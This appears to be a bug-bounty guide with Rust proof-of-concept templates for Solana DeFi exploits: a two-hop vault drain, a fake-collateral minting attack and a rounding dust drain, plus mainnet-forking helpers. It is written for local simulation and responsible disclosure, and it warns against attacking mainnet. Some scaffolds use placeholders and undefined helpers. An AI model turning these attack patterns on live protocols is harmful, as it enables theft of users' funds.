# PoC Templates — litesvm, solana-program-test, mainnet-fork

A PoC is the difference between a paid finding and an auto-rejected one. This file contains working scaffolds for the three most common PoC frameworks, ranked by what triagers expect.

**Triagers' preferred order:** litesvm > solana-program-test > devnet transaction signature.

litesvm runs in-memory, fast (no validator startup), and reproduces the program from its bytecode. It's the de-facto standard as of 2026.

---

## Setup: Cargo.toml for a PoC repo

```toml
[package]
name = "exploit-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
litesvm = "0.5"
litesvm-token = "0.5"
solana-sdk = "2.0"
solana-program = "2.0"
spl-token = "6.0"
spl-token-2022 = "5.0"
spl-associated-token-account = "5.0"
borsh = "1.5"
anchor-lang = "0.30.1"  # match the target program's Anchor version
anchor-spl = "0.30.1"
bytemuck = { version = "1.16", features = ["derive"] }

# The target program's IDL types (use anchor's idl-build or copy types)
# whirlpool = { path = "../whirlpools/programs/whirlpool", features = ["no-entrypoint"] }

[dev-dependencies]
# nothing — keep tests in the main crate for simplicity

[features]
default = []
```

---

## Template 1: litesvm — minimal CLMM swap exploit

```rust
// src/lib.rs (or tests/exploit.rs)

use litesvm::{LiteSVM, types::TransactionMetadata};
use litesvm_token::{spl_token, CreateAssociatedTokenAccount, CreateMint, MintTo};
use solana_sdk::{
    account::Account,
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
    system_program,
    transaction::Transaction,
    instruction::{AccountMeta, Instruction},
    message::Message,
    compute_budget::ComputeBudgetInstruction,
};

const WHIRLPOOL_PROGRAM_ID: Pubkey = solana_sdk::pubkey!("whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc");

fn setup_svm() -> (LiteSVM, Keypair) {
    let mut svm = LiteSVM::new();

    // Load the deployed Whirlpools program from the local clone
    // First: solana program dump <PROGRAM_ID> /tmp/whirlpool.so
    svm.add_program_from_file(WHIRLPOOL_PROGRAM_ID, "/tmp/whirlpool.so").unwrap();

    // Funded payer
    let payer = Keypair::new();
    svm.airdrop(&payer.pubkey(), 100 * 1_000_000_000).unwrap();  // 100 SOL

    (svm, payer)
}

fn create_two_mints(svm: &mut LiteSVM, payer: &Keypair) -> (Pubkey, Pubkey) {
    let mint_a = CreateMint::new(svm, payer)
        .decimals(9)
        .send()
        .unwrap();
    let mint_b = CreateMint::new(svm, payer)
        .decimals(6)
        .send()
        .unwrap();
    (mint_a, mint_b)
}

fn fund_user_with_tokens(svm: &mut LiteSVM, payer: &Keypair, user: &Pubkey, mint: &Pubkey, amount: u64) -> Pubkey {
    let user_ata = CreateAssociatedTokenAccount::new(svm, payer, mint)
        .owner(user)
        .send()
        .unwrap();
    MintTo::new(svm, payer, mint, &user_ata, amount).send().unwrap();
    user_ata
}

#[test]
fn poc_drain_via_two_hop_same_vault() {
    let (mut svm, payer) = setup_svm();
    let (mint_a, mint_b) = create_two_mints(&mut svm, &payer);

    // Step 1: Set up two pools that share the mint_b vault (pathological config)
    // ... (specific to the bug being exploited; this is illustration)

    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    let attacker_ata_a = fund_user_with_tokens(&mut svm, &payer, &attacker.pubkey(), &mint_a, 1_000_000_000);
    let attacker_ata_b = fund_user_with_tokens(&mut svm, &payer, &attacker.pubkey(), &mint_b, 0);

    // Snapshot balance before
    let balance_a_before = svm.get_account(&attacker_ata_a).unwrap().lamports;

    // Step 2: Build the malicious two_hop_swap
    let two_hop_ix = build_two_hop_swap_instruction(...);

    let cu_limit = ComputeBudgetInstruction::set_compute_unit_limit(1_400_000);
    let tx = Transaction::new_signed_with_payer(
        &[cu_limit, two_hop_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    let result = svm.send_transaction(tx);

    assert!(result.is_ok(), "exploit tx should succeed: {:?}", result);

    // Step 3: Snapshot balance after, assert unauthorized gain
    let balance_a_after = svm.get_account(&attacker_ata_a).unwrap().lamports;
    let balance_b_after = read_token_amount(&svm, &attacker_ata_b);

    println!("attacker started with: {} mint_a, 0 mint_b", balance_a_before);
    println!("attacker ended with: {} mint_a, {} mint_b", balance_a_after, balance_b_after);
    println!("net gain (mint_b): {}", balance_b_after);

    // The exploit assertion: attacker gained mint_b without losing equivalent mint_a
    assert!(balance_b_after > 1_000_000, "attacker should have drained mint_b");
}

fn read_token_amount(svm: &LiteSVM, ata: &Pubkey) -> u64 {
    use spl_token::state::Account as TokenAccount;
    use solana_program::program_pack::Pack;
    let acc = svm.get_account(ata).unwrap();
    TokenAccount::unpack(&acc.data).unwrap().amount
}
```

---

## Template 2: Account confusion exploit — Cashio-pattern

```rust
#[test]
fn poc_fake_collateral_account() {
    let (mut svm, payer) = setup_svm();
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();

    // Step 1: Initialize the protocol with REAL collateral (10 USDC = 10 CASH)
    initialize_protocol(&mut svm, &payer, 10_000_000);  // 10 USDC

    // Step 2: Create FAKE collateral account that mimics the real one
    let fake_crate = Keypair::new();
    let fake_collateral = create_fake_token_account(
        &mut svm,
        &payer,
        &fake_crate.pubkey(),
        u64::MAX / 2,  // claim huge collateral
    );

    // Step 3: Call print_cash with the fake account
    let print_ix = build_print_cash_instruction(
        &attacker.pubkey(),
        &fake_collateral,  // ← fake account passed as "crate_collateral"
        u64::MAX / 2,
    );

    let tx = Transaction::new_signed_with_payer(
        &[print_ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );
    let result = svm.send_transaction(tx);

    if result.is_err() {
        panic!("Bug NOT present — protocol rejected fake crate. Error: {:?}", result);
    }

    // Step 4: Verify attacker got CASH minted against fake collateral
    let attacker_cash_balance = read_token_amount(&svm, &attacker_cash_ata);
    assert!(attacker_cash_balance > 1_000_000_000, "attacker should have minted huge CASH");

    println!("EXPLOIT CONFIRMED: minted {} CASH against fake collateral", attacker_cash_balance);
}

fn create_fake_token_account(
    svm: &mut LiteSVM,
    payer: &Keypair,
    fake_owner: &Pubkey,
    fake_amount: u64,
) -> Pubkey {
    use spl_token::state::{Account, AccountState};
    use solana_program::program_pack::Pack;

    let mint = Keypair::new().pubkey();  // fake mint
    let account = Keypair::new();

    let mut data = vec![0u8; Account::LEN];
    let token_account = Account {
        mint,
        owner: *fake_owner,
        amount: fake_amount,
        delegate: None.into(),
        state: AccountState::Initialized,
        is_native: None.into(),
        delegated_amount: 0,
        close_authority: None.into(),
    };
    Account::pack(token_account, &mut data).unwrap();

    svm.set_account(&account.pubkey(), Account {
        lamports: 1_500_000,  // rent-exempt
        data,
        owner: spl_token::id(),
        executable: false,
        rent_epoch: 0,
    }).unwrap();

    account.pubkey()
}
```

---

## Template 3: Math/rounding exploit — drain via repeated dust

```rust
#[test]
fn poc_rounding_drain_via_repeated_micro_swaps() {
    let (mut svm, payer) = setup_svm();
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();

    let pool = setup_pool_with_liquidity(&mut svm, &payer, 1_000_000_000_000);
    let attacker_ata_a = fund_user_with_tokens(&mut svm, &payer, &attacker.pubkey(), &pool.mint_a, 100_000_000);
    let attacker_ata_b = fund_user_with_tokens(&mut svm, &payer, &attacker.pubkey(), &pool.mint_b, 0);

    let pool_balance_a_before = read_token_amount(&svm, &pool.vault_a);
    let pool_balance_b_before = read_token_amount(&svm, &pool.vault_b);
    let attacker_a_before = read_token_amount(&svm, &attacker_ata_a);

    // Execute many micro-swaps each exploiting 1-wei rounding
    for _ in 0..1000 {
        let swap_ix = build_micro_swap_instruction(
            &pool,
            &attacker_ata_a,
            &attacker_ata_b,
            1,  // 1 wei input
        );
        let tx = Transaction::new_signed_with_payer(
            &[ComputeBudgetInstruction::set_compute_unit_limit(200_000), swap_ix],
            Some(&attacker.pubkey()),
            &[&attacker],
            svm.latest_blockhash(),
        );
        let _ = svm.send_transaction(tx);
    }

    let pool_balance_a_after = read_token_amount(&svm, &pool.vault_a);
    let pool_balance_b_after = read_token_amount(&svm, &pool.vault_b);
    let attacker_a_after = read_token_amount(&svm, &attacker_ata_a);
    let attacker_b_after = read_token_amount(&svm, &attacker_ata_b);

    let attacker_lost_a = attacker_a_before - attacker_a_after;
    let attacker_gained_b = attacker_b_after;

    println!("Pool A: {} -> {} (delta {})", pool_balance_a_before, pool_balance_a_after, pool_balance_a_after as i64 - pool_balance_a_before as i64);
    println!("Pool B: {} -> {} (delta {})", pool_balance_b_before, pool_balance_b_after, pool_balance_b_after as i64 - pool_balance_b_before as i64);
    println!("Attacker A spent: {}", attacker_lost_a);
    println!("Attacker B gained: {}", attacker_gained_b);

    // Exploit assertion: attacker gained more value than they spent
    let fair_b_received = attacker_lost_a * pool_b_per_a_price;  // expected at fair rate
    assert!(attacker_gained_b > fair_b_received, "attacker should have gained extra via rounding");
    println!("UNFAIR GAIN: {} wei", attacker_gained_b - fair_b_received);
}
```

---

## Template 4: Mainnet fork — replay an attack against live state

For exploits that depend on specific mainnet state (large existing positions, specific oracle prices, etc.), fork the mainnet:

```rust
use solana_program_test::{ProgramTest, ProgramTestContext};

#[tokio::test]
async fn poc_with_mainnet_fork() {
    let mut program_test = ProgramTest::default();

    // Add the target program
    program_test.add_program("whirlpool", WHIRLPOOL_PROGRAM_ID, None);

    // Clone specific accounts from mainnet
    let rpc_url = std::env::var("MAINNET_RPC").expect("set MAINNET_RPC");
    let rpc = solana_client::rpc_client::RpcClient::new(rpc_url);

    let accounts_to_clone = [
        // pool address
        Pubkey::from_str("HJPjoWUrhoZzkNfRpHuieeFk9WcZWjwy6PBjZ81ngndJ").unwrap(),
        // vault_a address
        Pubkey::from_str("...").unwrap(),
        // vault_b address
        Pubkey::from_str("...").unwrap(),
        // tick array addresses involved in the attack
        // ...
    ];

    for pubkey in accounts_to_clone {
        let acc = rpc.get_account(&pubkey).unwrap();
        program_test.add_account(pubkey, acc);
    }

    let mut ctx = program_test.start_with_context().await;

    // ... build and send the attack tx ...
}
```

For Solana, alternatively use `solana-test-validator --account` flags to run a real validator with cloned accounts. Slower than litesvm but more accurate.

---

## Common helpers

### Compute the tick array PDA
```rust
fn tick_array_pda(whirlpool: &Pubkey, start_tick_index: i32) -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[
            b"tick_array",
            whirlpool.as_ref(),
            start_tick_index.to_string().as_bytes(),
        ],
        &WHIRLPOOL_PROGRAM_ID,
    )
}
```

### Compute the position PDA
```rust
fn position_pda(position_mint: &Pubkey) -> (Pubkey, u8) {
    Pubkey::find_program_address(
        &[b"position", position_mint.as_ref()],
        &WHIRLPOOL_PROGRAM_ID,
    )
}
```

### Read a typed account
```rust
fn read_pool(svm: &LiteSVM, pool: &Pubkey) -> Whirlpool {
    let acc = svm.get_account(pool).unwrap();
    let data = &acc.data[8..];  // skip discriminator
    Whirlpool::try_deserialize_unchecked(&mut &*data).unwrap()
}
```

### Build an Anchor instruction
```rust
fn build_anchor_ix(
    program_id: Pubkey,
    accounts: Vec<AccountMeta>,
    instruction_name: &str,  // e.g., "swap"
    args: impl borsh::BorshSerialize,
) -> Instruction {
    use anchor_lang::Discriminator;

    let discriminator = anchor_lang::solana_program::hash::hash(
        format!("global:{}", instruction_name).as_bytes()
    ).to_bytes()[..8].to_vec();

    let mut data = discriminator;
    args.serialize(&mut data).unwrap();

    Instruction {
        program_id,
        accounts,
        data,
    }
}
```

### Get program from mainnet
```bash
# One-time setup: dump the deployed program
solana program dump whirLbMiicVdio4qvUfM5KAg6Ct8VwpYzGff3uctyCc /tmp/whirlpool.so

# In the PoC:
svm.add_program_from_file(WHIRLPOOL_PROGRAM_ID, "/tmp/whirlpool.so").unwrap();
```

This dumps the EXACT mainnet bytecode. Triagers can reproduce by running the same dump command.

---

## PoC checklist — what to include

```
[ ] Repo with Cargo.toml + src/lib.rs (or tests/exploit.rs)
[ ] One test function that:
    [ ] Sets up a fresh LiteSVM (no implicit state)
    [ ] Loads the target program from a known bytecode dump
    [ ] Initializes the protocol from scratch (or forks mainnet state)
    [ ] Funds an "attacker" keypair
    [ ] Executes the attack as a series of transactions
    [ ] Asserts the unauthorized state change explicitly (not just "tx succeeded")
[ ] Output that shows clear before/after balances or state
[ ] README.md explaining: how to run (`cargo test`), expected output, what the exploit shows
[ ] Comments in code indicating WHICH file:line of the target program has the bug
[ ] Bytecode hash of the target program
[ ] Pinned versions in Cargo.toml so the PoC doesn't break in 6 months
```

---

## Common PoC failure modes (don't make these mistakes)

### A. PoC succeeds but doesn't actually exploit anything

Test passes because the tx returned Ok, but no actual unauthorized change happened. Always assert state changes, not just tx success.

```rust
// Bad
assert!(result.is_ok());

// Good
let attacker_balance_after = read_token_amount(&svm, &attacker_ata);
assert!(attacker_balance_after > attacker_balance_before + EXPECTED_FAIR_GAIN);
```

### B. Exploit "works" only because of unrealistic preconditions

If the test sets up state that wouldn't exist on mainnet (e.g., zero-fee config, admin already compromised), the bug isn't real.

Document preconditions explicitly. If the precondition is "admin sets fee=0" and admin can do that anyway, the bug is OOS (admin abuse).

### C. PoC requires modified bytecode

If you need to recompile the target program with a flag set, the bug is in code that doesn't ship to mainnet. OOS unless you're hunting for a future bug.

### D. PoC works in litesvm but not on devnet

Sometimes litesvm and the real validator differ slightly (compute budget, sysvar values, slot semantics). Verify on devnet too if the bug is sensitive to runtime differences.

### E. PoC requires unrealistic CU

Solana txns have a max 1.4M CU. If the exploit needs more (e.g., requires processing 1000 ticks in one swap), it's not feasible. Test with realistic CU limits:
```rust
ComputeBudgetInstruction::set_compute_unit_limit(1_400_000)
```

---

## How to share the PoC with triagers

GitHub repo is best:
- Public if the bug is fixed already
- Private gist with the triager's GitHub username added if not yet fixed
- Attach to Immunefi report directly if small (< 1MB)

The repo should be:
- Self-contained (`git clone && cargo test` works)
- README with one-line "run this command to see the exploit"
- No external dependencies that could break (pin versions, vendor if needed)

Triagers spend < 30 minutes per report on average. If your PoC requires setup beyond that, the report gets deprioritized.

---

## Mainnet PoCs — DON'T

Never run an exploit against mainnet, even if you're "just testing":
- Bug bounty programs explicitly forbid this
- You may inadvertently lose user funds
- The team will (rightfully) be hostile
- You get blacklisted on Immunefi

If you absolutely need mainnet state, fork it (template 4 above) or use `solana-test-validator --clone <pubkey>`.

The exception: if you legitimately found yourself with funds you shouldn't have (unintentional exploit while testing), report immediately to the team and Immunefi. Some programs reward responsible disclosure even for accidental exploits, but unprompted mainnet attacks always result in legal consequences.

---

## Performance optimization for litesvm tests

If your PoC needs many iterations (e.g., dust drain over 10000 swaps):

```rust
// Disable signature verification (PoC-internal, not adversarial)
let mut svm = LiteSVM::new()
    .with_sigverify(false)
    .with_blockhash_check(false);

// Increase compute budget if needed (default is plenty)
// Use single-threaded async execution for predictable ordering
```

Most PoCs run in < 5 seconds. If yours takes > 30 seconds, simplify it — triagers won't wait.
